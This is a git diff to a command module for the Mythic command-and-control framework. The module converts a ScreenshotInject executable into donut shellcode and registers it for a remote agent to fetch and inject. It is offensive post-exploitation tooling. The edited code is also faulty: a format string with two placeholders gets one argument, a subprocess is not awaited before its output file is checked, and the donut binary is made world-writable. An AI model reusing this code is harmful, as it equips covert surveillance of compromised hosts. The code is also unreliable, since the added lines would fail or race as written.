@@ -1,3 +1,4 @@
+import os
 from mythic_payloadtype_container.MythicCommandBase import *
 from uuid import uuid4
 import json
@@ -45,17 +46,28 @@ class ScreenshotInjectCommand(CommandBase):
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         exePath = "/srv/ScreenshotInject.exe"
-        donutPic = donut.create(file=exePath, params=task.args.get_arg("pipe_name"))
-        file_resp = await MythicRPC().execute(
-            "create_file",
-            task_id=task.id,
-            file=base64.b64encode(donutPic).decode(),
-            delete_after_fetch=True,
-        )
-        if file_resp.status == MythicStatus.Success:
-            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
+        donutPath = "/Mythic/agent_code/donut"
+        command = "chmod 777 {}; chmod +x {}".format(donutPath)
+        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
+        stdout, stderr = await proc.communicate()
+        
+        command = "{} -f 1 {}".format(donutPath, exePath)
+        # need to go through one more step to turn our exe into shellcode
+        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
+                                        stderr=asyncio.subprocess.PIPE, cwd="/tmp/")
+        if os.path.exists("/tmp/loader.bin"):
+            file_resp = await MythicRPC().execute(
+                "create_file",
+                task_id=task.id,
+                file=base64.b64encode(open("/tmp/loader.bin", 'rb').read()).decode(),
+                delete_after_fetch=True,
+            )
+            if file_resp.status == MythicStatus.Success:
+                task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
+            else:
+                raise Exception("Failed to register screenshot assembly: " + file_resp.error)
         else:
-            raise Exception("Failed to register execute-assembly DLL: " + file_resp.error)
+            raise Exception("Failed to find loader.bin")
         return task
 
     async def process_response(self, response: AgentResponse):
